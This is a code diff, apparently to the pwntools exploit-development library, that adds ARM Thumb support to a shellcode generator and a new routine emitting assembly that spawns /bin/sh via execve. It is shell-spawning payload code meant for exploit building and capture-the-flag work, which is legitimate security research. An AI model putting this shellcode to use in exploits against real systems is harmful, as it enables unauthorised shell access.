@@ -1,6 +1,6 @@
 from pwn.internal.shellcode_helper import *
 
-@shellcode_reqs(arch=['i386', 'amd64', 'arm'], os=['linux', 'freebsd'])
+@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
 def sh(arch = None, os = None):
     """Spawn a shell."""
 
@@ -16,6 +16,8 @@ def sh(arch = None, os = None):
             return _sh_freebsd_amd64()
     elif arch == 'arm' and os == 'linux':
         return _sh_linux_arm()
+    elif arch == 'thumb' and os == 'linux':
+        return _sh_linux_thumb()
 
     bug('OS/arch combination (%s,%s) is not supported' % (os,arch))
 
@@ -105,3 +107,22 @@ def _sh_linux_arm():
             'mov r1, sp',
             'svc SYS_execve',
             'bin_sh: .asciz "/bin/sh"'])
+
+def _sh_linux_thumb():
+    def mov(r, v):
+        return pwn.shellcode.mov(r, v, raw= True)
+    
+    out = """
+          adr r0, execve_addr
+          """
+    out+= mov('r2', 0)
+    out+= mov('r7', 'SYS_execve')
+    out+= """
+          push {r0, r2}
+          mov r1, sp
+          svc 1
+
+        execve_addr:
+            .ascii "/bin/sh"
+        """
+    return out
